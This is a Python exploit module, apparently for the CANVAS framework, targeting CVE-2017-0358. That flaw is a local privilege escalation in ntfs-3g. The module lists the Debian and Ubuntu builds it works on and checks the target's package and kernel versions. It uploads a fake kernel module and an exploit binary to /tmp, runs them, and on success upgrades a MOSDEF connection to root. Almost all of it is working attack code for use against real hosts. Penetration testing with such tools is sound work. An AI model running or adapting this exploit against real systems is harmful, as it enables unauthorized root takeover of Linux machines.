#!/usr/bin/env python

import sys
import re
import logging

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'ntfs-3g local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2017-0358'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'GNU'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2017-0358'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0358'
DOCUMENTATION['References']    = 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1072'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ["Linux",  "x32"], ["Linux",  "x64"] ]

DOCUMENTATION['Notes']         = """

Tested and working on:

Debian 8.8 jessie 64 bits
Linux 3.16.0-4-amd64 #1 SMP Debian 3.16.43-2+deb8u2 (2017-06-26) x86_64 GNU/Linux
ntfs-3g: 1:2014.2.15AR.2-1+deb8u2

Debian 9.0 stretch 64 bits
Linux 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) x86_64
ntfs-3g: 1:2014.2.15AR.2-1+deb8u2

<--- NOT RELIABLE --->
Ubuntu 16.10 Yakkety 64 bits
Linux ubuntu 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
ntfs-3g: 1:2016.2.22AR.1-3
Note: It is not fully realiable, so it has to be ran several times


---- should work but didn't test ------

Ubuntu 16.04.2 Xenial LTS 64 bits
Linux ubuntu 4.8.0-36-generic #36~16.04.1-Ubuntu SMP Sun Feb 5 09:39:57 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
ntfs-3g: 1:2015.3.14AR.1-1build1

------

Doesn't work on:

Debian 9.0 stretch 32 bits
Linux 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) i686 GNU/Linux
ntfs-3g: 1:2016.2.22AR.1-3:
Note: Even when modprobe is called, it is not taking the fakemodule as the fuse

Debian 7.11 wheezy 64 bits
Linux 3.2.0-4-amd64 #1 SMP Debian 3.2.89-2 x86_64 GNU/Linux
ntfs-3g: 1:2012.1.15AR.5-2.1+deb7u2
Note: The modprobe is not being called at anytime, tried the exploit of Google Project Zero and didn't work neither


"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_helper       = self.local_helper_64
        self.local_exp          = os.path.join(self.local_res, 'x_64')
        self.remote_exp         = "/tmp/test.sh"
        self.remote_helper      = '/tmp/h'
        self.remote_tmp_dir     = '/tmp/'

    def parse_dpkg_output(self, dpkg_text):
        re_ii_and_vers = re.compile("(\w+).*ntfs-3g\s+(.*?)\s+", re.MULTILINE|re.DOTALL)
        matched = re_ii_and_vers.match(dpkg_text)
        if matched is not None and matched.group(1).strip() == 'ii':
            return matched.group(2)
        return "Version not available"

    def is_vulnerable(self):
        if self.node and self.node.shell:
            # Example version for Debian 8.8 jessie
            # ii ntfs-3g 1:2014.2.15AR.2-1+deb8u2 amd64 read/write NTFS driver for FUSE
            dpkg_output = self.node.shell.runcommand("dpkg -l | grep ntfs-3g")
            if dpkg_output:
                ntfs_version = self.parse_dpkg_output(dpkg_output)
                if ntfs_version.lower().strip() in ("1:2014.2.15ar.2-1+deb8u2", "1:2015.3.14ar.1-1build1", "1:2016.2.22ar.1-3"):
                    return True
                else:
                    # ntfs-3g is not present, or version not vulnerable
                    warn_message = "ntfs-3g is not present, or version not vulnerable in target host ({})".format(ntfs_version.lower().strip())
                    logging.warning(warn_message)
                    return False
        return False

    def is_kernel_version_supported(self, kernel_version):
        return kernel_version in ["3.16.0-4-amd64", "4.8.0-22-generic", "4.8.0-36-generic", "4.9.0-3-amd64"]

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.critical("Node has no shell server available")
                logging.critical("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                return False

            if not self.is_linux_node():
                logging.error("Not a Linux Node ...")
                self.setInfo("%s Done (Failed - Not a Linux node)" % (self.name))
                return False

            if not self.is_vulnerable():
                logging.error("Target not vulnerable")
                self.setInfo("%s Done (Target not vulnerable)" % (self.name))
                return False
            else:
                logging.info("Target seems to be vulnerable!")

            if self.is_64bit_node():
                logging.warning("Targeting 64bit")
                self.local_lib = os.path.join(self.local_res, 'libup.so')
            elif self.is_32bit_node():
                # # # # # # # # # # # # # # # # # # # # # # # # # # #
                # TODO: It is not working on 32bit hosts (debian/ubuntu)
                logging.error("32bit is not yet supported")
                continue
                # # # # # # # # # # # # # # # # # # # # # # # # # # #
                logging.warning("Targeting 32bit")
                self.local_exp = os.path.join(self.local_res, 'x_32')
                self.local_helper = self.local_helper_32
                self.local_lib = os.path.join(self.local_res, 'libup32.so')
            else:
                logging.error("Unsupported node type")
                continue

            logging.info("Uploading necessary files for exploit")
            uname_r_output = self.node.shell.runcommand("uname -r").strip().replace('\n','').replace('\r','')

            if not self.is_kernel_version_supported(uname_r_output):
                logging.error("Kernel version %s is not supported" % uname_r_output)
                self.setInfo("%s (Failed)" % (self.name))
                self.setProgress(-1)
                return 0

            local_resources_directory = os.path.join(self.local_res, uname_r_output)
            local_resources_directory = os.path.join(local_resources_directory, 'compiled')

            files_to_upload = ['fakemodule.ko', 'modules.alias.bin', 'modules.builtin.bin', 'modules.dep.bin', 'modules.order', 'modules.symbols.bin', 'exploit_CVE-2017-0358', 'test.sh']
            progress = 0

            for f in files_to_upload:
                filename = os.path.join(local_resources_directory, f)
                rmt_filename = self.remote_tmp_dir + f
                if self.nodeUpload(filename, rmt_filename) == False:
                    self.setInfo("%s Done (Failed to upload preload source)" % (self.name))
                    continue

                self.add_file_for_cleanup(f)
                progress += len(files_to_upload) / 20
                self.setProgress(progress)

            self.setProgress(40)

            if self.nodeUpload(self.local_helper, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)
            self.add_file_for_cleanup(self.remote_helper)

            logging.info("Executing exploit")
            # It may be needed to run the exploit more than once
            self.node.shell.runcommand("chmod +x /tmp/test.sh")
            self.fork_and_exec(self.remote_exp, 1)
            msg_to_log = "Waiting... (Command executed: {})".format(self.remote_exp)
            logging.info(msg_to_log)
            self.setProgress(90)

            # Wait 7 secs for the exploit to complete
            wait_secs = 15
            if self.compromised(self.remote_helper, wait_secs):
                logging.warning("Compromised!")
                logging.info("Upgrading MOSDEF connection loop")
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.init_mosdef_upgrade()
                logging.info("Done")
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error("Looks like we failed, try again!")
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)
                return 0


        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
